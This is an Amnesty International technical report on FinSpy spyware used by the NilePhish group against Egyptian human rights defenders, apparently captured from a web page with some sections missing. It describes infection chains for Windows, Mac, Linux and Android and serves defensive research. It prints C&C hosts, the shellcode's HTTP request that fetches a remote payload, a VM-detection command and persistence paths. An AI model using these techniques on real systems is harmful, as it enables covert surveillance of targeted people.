Since 2011 researchers have documented numerous cases of targeting of Human Rights Defenders (HRDs) - including activists, journalists, and dissidents with the use of FinSpy in many countries, including Bahrain, Ethiopia, UAE, and more. Because of this, Amnesty International’s Security Lab tracks FinSpy usage and development as part of our continuous monitoring of digital threats to Human Rights Defenders. • Amnesty International published a report in March 2019 describing phishing attacks targeting Egyptian human rights defenders and media and civil society organizations staff carried out by an attacker group known as “NilePhish”. While continuing research into this group’s activity, we discovered it has distributed samples of FinSpy for Microsoft Windows through a fake Adobe Flash Player download website. Amnesty International has not documented human rights violations by NilePhish directly linked to FinFisher products. • Through additional technical investigations into this most recent variant, Amnesty’s Security Lab also discovered, exposed online by an unknown actor, new samples of FinSpy for Windows, Android, and previously undisclosed versions for Linux and MacOS computers. • This report provides technical information on these recent FinSpy samples in order to aid the cybersecurity research community in further investigations, enable cybersecurity vendors implement protection mechanisms against these newly discovered variants, and to raise awareness among HRDs of evolving digital attack techniques." />

		<h1 class="article-title wp-block-post-title">German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed</h1>
	</header>
	
	
	<article class="wp-block-group article-content is-layout-flow wp-block-group-is-layout-flow">
		<div class="entry-content wp-block-post-content is-layout-flow wp-block-post-content-is-layout-flow">
<h2 class="wp-block-heading" id="h-summary"><span>Summary:</span></h2>



<ul class="wp-block-list">
<li><span>FinSpy is a commercial spyware suite produced by the Munich-based company FinFisher Gmbh. Since 2011 researchers have documented numerous cases of targeting of Human Rights Defenders (HRDs) – including activists, journalists, and dissidents with the use of FinSpy in many countries, including <a href="https://citizenlab.ca/2012/07/from-bahrain-with-love-finfishers-spy-kit-exposed/" target="_blank" rel="noopener">Bahrain</a>, <a href="https://privacyinternational.org/blog/1199/surveillance-follows-ethiopian-political-refugee-uk" target="_blank" rel="noopener">Ethiopia</a>, UAE, and more. Because of this, Amnesty International’s Security Lab tracks FinSpy usage and development as part of our continuous monitoring of digital threats to Human Rights Defenders.</span></li>



<li><span>Amnesty International <a href="https://www.amnesty.org/en/latest/research/2019/03/phishing-attacks-using-third-party-applications-against-egyptian-civil-society-organizations/" target="_blank" rel="noopener">published a report</a> in March 2019 describing phishing attacks targeting Egyptian human rights defenders and media and civil society organizations staff carried out by an attacker group known as “NilePhish”. While continuing research into this group’s activity, we discovered it has distributed samples of FinSpy for Microsoft Windows through a fake Adobe Flash Player download website. Amnesty International has not documented human rights violations by NilePhish directly linked to FinFisher products.</span></li>



<li><span>Through additional technical investigations into this most recent variant, Amnesty’s Security Lab also discovered, exposed online by an unknown actor, new samples of FinSpy for Windows, Android, and previously undisclosed versions for Linux and MacOS computers.</span></li>



<li><span>This report provides technical information on these recent FinSpy samples in order to aid the cybersecurity research community in further investigations, enable cybersecurity vendors implement protection mechanisms against these newly discovered variants, and to raise awareness among HRDs of evolving digital attack techniques.</span></li>
</ul>



<h2 class="wp-block-heading" id="h-introduction"><span>Introduction</span></h2>



<p><span>FinSpy is a full-fledged surveillance software suite, capable of intercepting communications, accessing private data, and recording audio and video, from the computer or mobile devices it is silently installed on. FinSpy is produced by Munich-based company FinFisher Gmbh and sold to law enforcement and government agencies around the world. </span>According to media reports, when<span> Egyptian protesters broke into the offices of </span>the now dissolved State Security Investigations Service, an intelligence body responsible for investigating security threats and notorious for committing grave human rights violations during Hosni Mubarak’s decades’ long rule, in 2011, they<span> discovered contracts for <a href="https://www.theguardian.com/technology/2011/apr/28/egypt-spying-software-gamma-finfisher" target="_blank" rel="noopener">the sale of FinSpy to Egyptian authorities</a>. Since then, research groups such as Citizen Lab, at the University of Toronto, and Privacy International have discovered FinSpy being used to target HRDs and civil society in many countries, including <a href="https://citizenlab.ca/2012/07/from-bahrain-with-love-finfishers-spy-kit-exposed/" target="_blank" rel="noopener">Bahrain</a>, <a href="https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/" target="_blank" rel="noopener">Turkey</a> and <a href="https://privacyinternational.org/blog/1199/surveillance-follows-ethiopian-political-refugee-uk" target="_blank" rel="noopener">Ethiopia</a>. Because of this, Amnesty International’s Security Lab tracks FinSpy usage and development as part of our continuous monitoring of digital threats to HRDs.</span></p>



<p><span>In September 2019, Amnesty International discovered samples of FinFisher’s spyware distributed by malicious infrastructure tied to the attacker group commonly known as NilePhish. </span>likely to be state sponsored. These attacks took place amid an unprecedented crackdown on independent civil society and <span><a href="https://www.amnesty.org/en/documents/mde12/9107/2018/en/" target="_blank" rel="noopener">any critical voices</a></span>. <span>Over the years, numerous <a href="https://citizenlab.org/2017/02/nilephish-report/" target="_blank" rel="noopener">research</a> <a href="https://research.checkpoint.com/2019/the-eye-on-the-nile/" target="_blank" rel="noopener">reports</a>, including by <a href="https://www.amnesty.org/en/latest/research/2019/03/phishing-attacks-using-third-party-applications-against-egyptian-civil-society-organizations/" target="_blank" rel="noopener">Amnesty International</a>, detailed NilePhish’s campaigns of targeting of Egyptian civil society organizations. Further technical investigation by Amnesty’s Security Lab led to the discovery of additional previously unknown samples for Linux and Mac OS computers, provided with extensive interception capabilities.</span></p>



<p><span>With this report, Amnesty’s Security Lab shares new insights into the capabilities of the NilePhish attacker group, as well as provides detailed analysis of newly discovered variants of FinSpy in order to enable cybersecurity researchers to further investigate and develop protection mechanisms. In addition, we hope to raise awareness among HRDs on the evolution of digital attack techniques and help address common misconceptions that Linux and Mac computers are safer against spyware attacks.</span></p>



<h2 class="wp-block-heading" id="h-nilephish-fake-flash-player-update-deliver-finfisher-s-finspy"><span>NilePhish Fake Flash Player Update deliver FinFisher’s FinSpy</span></h2>



<p><span>In March 2019 Amnesty International’s Security Lab warned Egyptian civil society organizations of a widespread <a href="https://www.amnesty.org/en/latest/research/2019/03/phishing-attacks-using-third-party-applications-against-egyptian-civil-society-organizations/" target="_blank" rel="noopener">campaign of phishing attacks</a> targeting human rights defenders, conducted by the so-called NilePhish attacker group. Following the publication, we continued monitoring the malicious infrastructure operated by this group to identify any new attack campaigns.</span></p>



<p><span>By monitoring the group’s tools, techniques and attack infrastructure, in September 2019, Amnesty’s Security Lab identified the malicious website <strong>flash.browserupdate[.]download</strong> connected to NilePhish. The website pretended to be a warning by Adobe Flash Player recommending installing an update. Clicking anywhere on the page would download a recent version of Flash Player backdoored with FinSpy.</span></p>



<figure class="aimc-ignore wp-block-image aligncenter size-full"><div style="position:relative"><img fetchpriority="high" decoding="async" width="897" height="669" src="https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1.png" alt="" class="aiic-ignore wp-image-91342" srcset="https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1.png 897w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-300x224.png 300w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-768x573.png 768w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-804x600.png 804w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-97x72.png 97w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-193x144.png 193w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-60x45.png 60w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-120x89.png 120w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-200x149.png 200w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-400x298.png 400w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-260x194.png 260w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-520x388.png 520w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-325x242.png 325w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-650x485.png 650w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-1-600x447.png 600w" sizes="(max-width: 897px) 100vw, 897px"><div class="image-metadata is-image"><span class="image-metadataItem image-copyright" aria-hidden="true">Amnesty International </span></div></div><figcaption class="wp-element-caption">flash.browserupdate[.]download as displayed in September 2019</figcaption></figure>



<p><span>When we analyzed this Flash Player installer, we found it to be a FinSpy dropper (with hash f960144126748b971386731d35e41288336ad72a9da0c6b942287f397d57c600), designed to retrieve the final payload from the server <strong>https://172.241.27[.]171/support/personal.asp</strong>. This payload would then be loaded into memory and executed. The server was offline at the time of analysis and we therefore did not manage to retrieve any additional payload.</span></p>



<p><span>The version of Flash Player (32.0.0.269) used to bundle the FinSpy downloader was released by Adobe in September 2019. The file had a creation date of 20th September 2019. This suggests that backdoored binary was newly created around the time period in September 2019 when it was first uploaded to browserupdate[.]download.</span></p>



<p><span>It is worth noting that in 2017, ESET, a Slovak internet security company <a href="https://www.welivesecurity.com/2017/09/21/new-finfisher-surveillance-campaigns/" target="_blank" rel="noopener">reported that FinFisher spyware </a>was being delivered using network injection attacks in two (unnamed) countries. The research group Citizen Lab, located at the University of Toronto, later discovered evidence of equipment used for similar <a href="https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/" target="_blank" rel="noopener"><span>network injection attacks</span> </a>in Egypt, suggesting it might have also been used for the distribution of FinFisher’s FinSpy. We cannot exclude that targets of this campaign were redirected to the browserupdate[.]download page through network injection, as similar backdoored software have been used in network injection attacks <a href="https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/" target="_blank" rel="noopener">in the past</a>.</span></p>



<h2 class="wp-block-heading" id="h-connections-with-nilephish"><span>Connections with NilePhish</span></h2>



<p><span>The operators of this fake Flash Player download page created several other droppers which would download payloads from browserupdate[.]com. These included malicious Word documents containing macros, and a .NET program named <em>clean.downloader.exe</em> (with hash <a href="https://www.virustotal.com/gui/file/14658327efaa15275fb8718956ee97ebcad5bc80312a4f3182a3b10cd3dcf257/details" target="_blank" rel="noopener">14658327efaa15275fb8718956ee97ebcad5bc80312a4f3182a3b10cd3dcf257</a>), uploaded to the malware scanning service VirusTotal on 8th October 2019. These additional droppers appeared to be under development and used for testing purposes: each downloaded a legitimate version of the tool Putty from https://flash.browserupdate[.]download/putty.exe.</span></p>



<p>Revealingly, the .NET dropper included a PDB debug path from the developer’s computer: <strong>C:\Users\shenno\source\repos\clean.downloader\clean.downloader\obj\Release\clean.downloader.pdb.</strong></p>



<p>The username on the computer where this dropper was developed is “<strong>shenno</strong>”. This name we had previously found used by attackers behind the NilePhish campaign we detailed in our <span><a href="https://www.amnesty.org/en/latest/research/2019/03/phishing-attacks-using-third-party-applications-against-egyptian-civil-society-organizations/" target="_blank" rel="noopener">March 2019 report</a></span>. The Security Lab continued to monitor this group’s campaigns following our publication.</p>



<p>In February 2020, approximately 6 months after the initial FinSpy discovery, a new subdomain “files.browserupdate[.]download” was created which acted as reverse-proxy to a Cobalt Strike server hosted at 185.125.230.203 (more on this later). This IP is registered to a small Russian hosting company named Offshore Servers. Since 2018 we have observed NilePhish hosting a large part of their phishing infrastructure with Offshore Servers.</p>



<figure class="aimc-ignore wp-block-image aligncenter size-full"><div style="position:relative"><img decoding="async" width="601" height="375" src="https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8.png" alt="" class="aiic-ignore wp-image-91344" srcset="https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8.png 601w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-300x187.png 300w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-320x200.png 320w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-115x72.png 115w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-231x144.png 231w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-60x37.png 60w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-120x75.png 120w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-200x125.png 200w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-400x250.png 400w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-260x162.png 260w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-520x324.png 520w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-8-325x203.png 325w" sizes="(max-width: 601px) 100vw, 601px"><div class="image-metadata is-image"><span class="image-metadataItem image-copyright" aria-hidden="true">Amnesty International </span></div></div><figcaption class="wp-element-caption">Link between the FinSpy sample and NilePhish</figcaption></figure>



<p>In October 2019, cybersecurity firm CheckPoint released a <span><a href="https://research.checkpoint.com/2019/the-eye-on-the-nile/">follow-up report</a></span> based on Amnesty International’s research which independently confirmed links between NilePhish, the Offshore Servers infrastructure and the operator named “shenno”. CheckPoint identified an Egyptian individual who they linked to NilePhish and the “shenno” username and first revealed it to the public. At the time of our discovery of the fake Flash Player FinSpy dropper, “shenno” had not been disclosed yet.</p>



<p><span>The combination of nickname reuse, the use of the same hosting provider Offshore Servers, and the registration of additional NilePhish domains with the same registrar in September 2019 ties this activity to NilePhish. These additional NilePhish domains include loglive.co (registered September 11th), webmaillive.co (registered September 15th), and onlineaccount.live (registered October 2nd, 2019). Amnesty International has not confirmed how NilePhish obtained FinSpy software.</span></p>



<h2 class="wp-block-heading" id="h-nilephish-testing-cobalt-strike"><span>NilePhish testing Cobalt Strike</span></h2>



<p><span>In February 2020, a new subdomain <strong>files.browserupdate[.]download</strong> was created pointing to server at </span>5.135.174[.]213, serviced by French hosting company OVH. This server was hosting an HTTP server with a valid TLS certificate on port 443. Using <span><a href="https://www.censys.io" target="_blank" rel="noopener">Censys</a></span> we found that the server hosted on Offshore Servers at <span>185.125.230[.]203 was also running a web server with the same TLS cert. Timing measurements showed that the OVH server was a reverse proxy for 185.125.230[.]203.</span></p>



<p><span>Probing any URL which matched the U</span><em>RI </em>checksum algorithm<span> used by Cobalt Strike and Metasploit, would indeed serve Cobalt Strike payloads.</span></p>

<p>&gt; system_profiler SPUSBDataType | egrep -i “Manufacturer: (parallels|vmware|virtualbox)”</p>



<p><span>If it is not, it then decrypts, by XOR’ing with the string “NSString”, a Zip archive at the path <em>/tmp/arch.zip</em> and unpacks it to <em>/tmp/org.logind.ctp.archive</em>. This archive contains the installer, the main cyload, but also binaries for privilege escalation:</span></p>

<li><em><span>helper</span></em><span>: exploits a bug <a href="https://www.exploit-db.com/exploits/36739" target="_blank" rel="noopener">in Mac OS X  fixed in 2013 or 2014.</a></span></li>

<p><span>This first stage uses the exploits to get root access. If none of them work, it will ask the user to grant root permissions to launch the next stage installer.</span></p>



<p><span>The installer (<em>/tmp/org.logind.ctp.archive/installer</em>) oversees installing the spyware in the system by:</span></p>

<li>Copying all the plugins and configuration files to /Library/Frameworks/Storage.framework.</li>



<li>Copying the launcher to /private/etc/logind.</li>



<li>Installing persistence by creating a logind.pslist file in /System/Library/LaunchAgents/ (T1543.001).</li>
</ol>



<h2 class="wp-block-heading">A modular framework</h2>



<p>FinSpy for Mac OS, and similarly its Linux counterpart, follow a modular design. The launcher logind only instantiates the core component dataPkg, which oversees communications with the Command and Control server (C&amp;C), and decrypting/launching modules when needed. The modules are encrypted with the AES algorithm and compressed with the aplib compression library. The AES key is stored in the binary, but the IV is stored in each configuration file along with a MD5 hash of the final decompressed file.</p>

<h2 class="wp-block-heading" id="h-command-control-communications">Command &amp; Control Communications</h2>



<p>The spyware communicates with the Command &amp; Control (C&amp;C) server using HTTP POST requests. The data sent to the server is encrypted using functions provided by the 7F module, compressed using a custom compressor and base64 encoded. All requests are made with a Content-Type chosen randomly from following list:</p>



<ul class="wp-block-list">
<li>application/pdf</li>



<li>application/zip</li>



<li>application/gzip</li>



<li>image/gif</li>



<li>image/jpeg</li>



<li>image/png</li>



<li>image/tiff</li>



<li>text/html</li>



<li>text/plain</li>
</ul>

<h2 class="wp-block-heading">Infection Chain</h2>



<p>The “PDF” file obtained from the server is a short script containing encoded binaries for Linux 32bit and 64bit. It extracts the binary for the relevant architecture in /tmp/udev2 and executes it. Like its Mac OS counterpart, FinSpy for Linux is also obfuscated using LLVM-Obfuscator.</p>

<h2 class="wp-block-heading">Emergency Reconfiguration</h2>



<p>FinSpy can be reconfigured via SMS, through the Java method org.xmlpush.v3.q.c.a(). When an SMS corresponding to TlvTypeMobileTargetEmergencyConfig is received, FinSpy reconfigures itself by parsing the received payload. The following attributes can be reconfigured:</p>



<ul class="wp-block-list">
<li>TlvTypeConfigTargetPort: port number for the C&amp;C proxy.</li>



<li>TlvTypeConfigSMSPhoneNumber: phone number for SMS based C&amp;C communications.</li>



<li>TlvTypeMobileTrojanID: unknown purpose.</li>



<li>TlvTypeMobileTrojanUID: unknown purpose.</li>



<li>TlvTypeUserID: unknown purpose.</li>



<li>TlvTypeTrojanMaxInfections: unknown purpose.</li>



<li>TlvTypeConfigMobileAutoRemovalDateTime: implant self-destruction time.</li>



<li>TlvTypeConfigAutoRemovalIfNoProxy: implant self-destruct if C&amp;C proxy is unavailable</li>



<li>TlvTypeMobileTargetHeartbeatRestrictions: conditions to avoid callbacks</li>



<li>TlvTypeMobileTargetHeartbeatEvents: events to trigger callbacks to the C&amp;C</li>



<li>TlvTypeMobileTargetLocationChangedRange: trigger updates based on location changes</li>



<li>TlvTypeInstalledModules: list of implant features and their configuration (SMS log, call log, etc.)</li>



<li>and other unknown parameters</li>
</ul>



<h2 class="wp-block-heading">New TLV types</h2>



<p>FinSpy stores its configuration and communicates with the C&amp;C server in a specific format called TLV devised by FinFisher developers in early versions. It stores first the size of the data, then an identifier for the type of data and then the data. This format was originally identified in a 2012 report by TrustWave. In this latest version new TLV values are introduced, including:</p>



<figure class="aimc-ignore wp-block-image aligncenter size-full"><div style="position:relative"><img loading="lazy" decoding="async" width="530" height="398" src="https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7.png" alt="" class="aiic-ignore wp-image-91352" srcset="https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7.png 530w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-300x225.png 300w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-96x72.png 96w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-192x144.png 192w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-60x45.png 60w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-120x90.png 120w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-200x150.png 200w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-400x300.png 400w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-260x195.png 260w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-520x390.png 520w, https://www.amnesty.org/en/wp-content/uploads/2021/06/ff-7-325x244.png 325w" sizes="auto, (max-width: 530px) 100vw, 530px"><div class="image-metadata is-image"><span class="image-metadataItem image-copyright" aria-hidden="true">Amnesty International </span></div></div></figure>



<h2 class="wp-block-heading">Timeline</h2>



<p>The certificate used to sign this application (sha256: 7C6E4F2E84EBAA8D25040F63D840E14F6F822125) was issued in May 2017, but the APK file was created on the 23rd of October 2019 according to the timestamp of the APK.</p>



<h2 class="wp-block-heading">Backdoored WinRAR: FinSpy for Windows</h2>



<p>The last sample identified (bb8c0e477512adab1db26eb77fe10dadbc5dcbf8e94569061c7199ca4626a420 wrar571.exe) is a backdoored version of the WinRAR software.</p>



<p>The file is a Self-extracting WinRAR archive, the code of the function __security_check_cookie was patched to redirect to an obfuscated shellcode. The shellcode is doing an HTTP POST request to get a final payload from the IP 207.244.95[.]223:</p>


<section id="section-880f3c36" class="section section--tinted section--small" style=""><div id="880f3c36" class="container">

<p>POST hxxp://207.244.95.223/docs/attachment.php?attachmentid=ce9de8c78b1053b5b3c1ad7887ddf53d&amp;d=<br>User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.<br>Proxy-Connection: Keep-Alive<br>Content-Length: 16<br>Host: 207.244.95.223</p>

</div></section>


<p>The shellcode then decrypts the payloads and run it in memory. We could not retrieve the payload during the investigation, but we expect it to download the next stages of FinSpy for Windows.</p>



<p>The extracted WinRAR program 5.71 was released in April 2019. the backdoor was thus generated between April and September 2019.</p>
